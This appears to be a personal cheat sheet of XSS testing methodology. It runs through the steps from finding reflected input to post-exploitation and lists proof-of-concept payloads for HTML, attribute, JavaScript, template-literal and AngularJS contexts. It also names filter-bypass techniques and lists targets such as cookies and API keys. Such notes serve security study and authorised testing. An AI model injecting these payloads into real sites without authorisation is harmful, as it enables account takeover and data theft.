# XSS Methodology

## Step 1 - Find Reflection

Questions:

```text
Is My Input Reflected?
Stored?
DOM Based?
```

Tools:

```text
Burp Suite
Search Boxes
Comments
Profile Fields
Headers
```

---

## Step 2 - Identify Context

Where does input appear?

```text
HTML
Attribute
JavaScript
URL
Template Literal
AngularJS
DOM
```

---

## Step 3 - Select Payload

### HTML Context

```html
<img src=1 onerror=alert(1)>
```

---

### Attribute Context

```html
" onmouseover="alert(1)
```

---

### JavaScript Context

```javascript
';alert(1)//
```

---

### Template Literal

```javascript
${alert(1)}
```

---

### AngularJS

```html
{{7*7}}
```

---

## Step 4 - Check Filters

Questions:

```text
Tags Blocked?
Quotes Blocked?
Events Blocked?
CSP Present?
```

---

## Step 5 - Bypass

Possible Techniques:

```text
SVG
Custom Tags
HTML Entities
Backslash Escape
Template Literals
AngularJS Sandbox Escape
Dangling Markup
```

---

## Step 6 - Assess Impact

Ask:

```text
Can I Read Data?
Can I Change Data?
Can I Take Over Account?
Can I Escalate Privileges?
```

---

## Step 7 - Post Exploitation

Check:

```text
Cookies
Passwords
CSRF Tokens
Email Change
API Keys
Admin Functions
```

---

# Personal Formula

```text
Reflection
        ↓
Context
        ↓
Payload
        ↓
Execution
        ↓
Impact
```